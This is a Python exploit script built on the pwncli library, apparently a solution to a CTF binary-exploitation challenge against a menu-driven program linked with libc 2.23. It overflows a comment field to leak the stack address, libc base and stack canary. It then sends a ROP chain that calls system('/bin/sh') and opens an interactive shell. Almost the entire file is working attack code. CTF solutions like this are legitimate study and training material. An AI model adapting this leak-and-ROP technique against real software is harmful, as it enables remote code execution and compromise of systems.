#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.23.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'>> ')
    sl(i2b(choice))
def update(comment):
    cmd(1)
    ru(b'Input new comment >> ')
    sl(comment)
def show():
    cmd(2)


name = b'eastXL_test'
year = -1
comment = b"a"*0x3
ru(b'Driver name >> ')
sl(name)
ru(b'Driver year >> ')
sl(i2b(year))
ru(b'Driver comment >> ')
sl(comment)

#  test_bit0 = (int(input("TESTBIT0: "), 16) << 4)
test_bit0 = 0x20
payload = b"a"*16 + p8(test_bit0)
update(payload)
show()
ru(b'Your name : ')
stack_base = u64_ex(rn(6)) - 0x10
lg("stack_base")

payload = p64(0) + p64(0x40155d) + p64(elf.got['setbuf'])
update(payload)
show()
ru(b'Your name : ')
libc_base = u64_ex(rn(6)) - libc.sym.setbuf
lg("libc_base")

payload = p64(0) + p64(0x40155d) + p64(stack_base + 0x48)
update(payload)
show()
ru(b'Your name : ')
canary = u64_ex(rn(8))
lg("canary")

payload = p64(0) + p64(0x40155d) + p64(stack_base + 0x30) + p64(0xb)
payload += p64(0)*2
payload += p64(0x1) + p64(canary) + p64(stack_base + 0x140)
payload += p64(0) + p64(0x4016b0)
payload += p64(0x0000000000401713)
payload += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
payload += p64(libc_base + libc.sym.system)
update(payload)

cmd(0)

ia()
